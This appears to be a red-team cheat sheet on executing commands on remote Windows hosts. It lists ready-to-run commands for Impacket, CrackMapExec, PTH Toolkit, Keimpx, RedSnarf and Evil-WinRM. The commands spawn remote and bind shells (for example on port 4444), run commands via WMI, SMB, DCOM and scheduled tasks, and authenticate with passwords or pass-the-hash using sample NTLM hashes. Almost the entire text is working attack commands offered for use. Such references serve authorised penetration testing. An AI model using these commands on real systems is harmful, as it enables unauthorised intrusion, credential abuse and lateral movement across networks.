Executing commands at Windows Remotely
======================================
Executing commands at Windows Remotely

## Impacket

use Impacket to execute commands on a remote Windows system

spawn an interactive remote shell via Psexec method:

`psexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>`

`psexec.py "./Administrator:pass123"@192.168.0.1`

spawn a semi-interactive remote shell using DCOM:

`dcomexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>`

`dcomexec.py "./Administrator:pass123"@192.168.0.1`

spawn a semi-interactive remote shell via native Windows SMB functionality:

`smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>`

`smbexec.py "./Administrator:pass123"@192.168.0.1`

spawn a semi-interactive remote shell using WMI:

`wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>`

`wmiexec.py "./Administrator:pass123"@192.168.0.1`

execute a command remotely via Atsvc:

`atexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET> <COMMAND>`

`atexec.py "./Administrator:pass123"@192.168.0.1 "whoami"`

use NTLM hash instead of a password:

`psexec.py -hashes <LM>:<NTLM> <DOMAIN>/<USER>@<TARGET>`

`psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.0.1`

## CrackMapExec

execute a command (CMD / PowerShell) remotely using WMI:

`crackmapexec smb -d <DOMAIN> -u <USER> -p <PASSWORD> -x <COMMAND> <TARGET>`

`crackmapexec smb -d . -u Administrator -p 'pass123' -x "whoami" 192.168.0.1`

execute a command (CMD / PowerShell) remotely via Atsvc:

`crackmapexec smb --exec-method atexec -d <DOMAIN> -u <USER> -p <PASSWORD> -x <COMMAND> <TARGET>`

`crackmapexec smb --exec-method atexec -d . -u Administrator -p 'pass123' -x "whoami" 192.168.0.1`

execute a command (CMD / PowerShell) remotely using native SMB:

`crackmapexec smb --exec-method smbexec -d <DOMAIN> -u <USER> -p <PASSWORD> -x <COMMAND> <TARGET>`

`crackmapexec smb --exec-method smbexec -d . -u Administrator -p 'pass123' -x "whoami" 192.168.0.1`

execute a command (CMD / PowerShell) remotely via MMC:

`crackmapexec smb --exec-method mmcexec -d <DOMAIN> -u <USER> -p <PASSWORD> -x <COMMAND> <TARGET>`

`crackmapexec smb --exec-method mmcexec -d . -u Administrator -p 'pass123' -x "whoami" 192.168.0.1`

execute a command (CMD / PowerShell) remotely using PSRemoting:

`crackmapexec winrm -d <DOMAIN> -u <USER> -p <PASSWORD> -x <COMMAND> <TARGET>`

`crackmapexec winrm -d . -u Administrator -p 'pass123' -x "whoami" 192.168.0.1`

CrackMapExec also supports passing the NTLM hash instead of a password:

`crackmapexec smb -d <DOMAIN> -u <USER> -H <LM:NTLM> -x <COMMAND> <TARGET>`

`crackmapexec smb -d . -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 -x "cmd /c whoami" 192.168.0.1`

## PTH Toolkit

spawn an interactive remote shell using Psexec-like method:

`pth-winexe -U <DOMAIN>\\<USER>%<PASSWORD> --uninstall //<TARGET> <COMMAND>`

`pth-winexe -U ".\Administrator%pass123" --uninstall //192.168.0.1 cmd`

execute a command remotely using WMI:

`pth-wmis -U <DOMAIN>\\<USER>%<PASSWORD> //<TARGET> <COMMAND>`

`pth-wmis -U ".\Administrator%pass123" //192.168.0.1 'cmd.exe /c whoami'`

NTLM hash instead of a password (pass-the-hash)

`pth-winexe -U <DOMAIN>\\<USER>%<LM|NTLM> --uninstall //<TARGET> <COMMAND>`

`pth-winexe -U ".\Administrator%aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76" --uninstall //192.168.0.1 cmd`

## Keimpx

launch Keimpx with a target list to connect to

`keimpx.py -D <DOMAIN> -U <USER> -P <PASSWORD> -t <TARGET>`

`keimpx.py -D . -U Administrator -P pass123 -t 192.168.0.1`

executes a command on the remote system using a Windows service. Type in the menu:

`svcexec <COMMAND>`

`svcexec "dir c:\users"`

svcexec SERVER method also executes a command, but it is designed for more restricted systems which do not have any writable network share

`svcexec <COMMAND> SERVER`

`svcexec "dir c:\users" SERVER`

spawn a semi-interactive shell on the remote system using a Windows service:

`svcshell`

spawn a remote shell on more restricted systems without any writable network share

`svcshell SERVER`

executes a command on the remote system via Atsvc

`atexec <COMMAND>`

`atexec "dir c:\users"`

any command including interactive commands such as cmd.exe or powershell.exe

`psexec <COMMAND>`

`psexec cmd.exe`

`psexec powershell.exe`

spawns a bindshell on the target Windows machine on a selected tcp port:

`bindshell <PORT>`

`bindshell 4444`

passing NTLM hashes instead of passwords

`keimpx.py -D <DOMAIN> -U <USER> --lm=<LM> --nt=<NTLM> -t <TARGET>`

`keimpx.py -D . -U Administrator --lm=aad3b435b51404eeaad3b435b51404ee --nt=5fbc3d5fec8206a30f4b6c473d68ae76 -t 192.168.0.1`

## RedSnarf

RedSnarf with a target to connect to. For example:

`redsnarf -H ip=<TARGET> -d <DOMAIN> -u <USER> -p <PASSWORD> -uD y`

`redsnarf -H ip=192.168.0.1 -d . -u Administrator -p pass123 -uD y`

## Evil WinRM

Uses Windows Remote Management (RM) to gain interactive PowerShell:

`evil-winrm -i <ip> -u <username> -H <NT hash>

`evil-winrm -i 10.0.0.1 -u someadmin -H '5c139265e2bbc74b40b5bb9d90ec7221'`
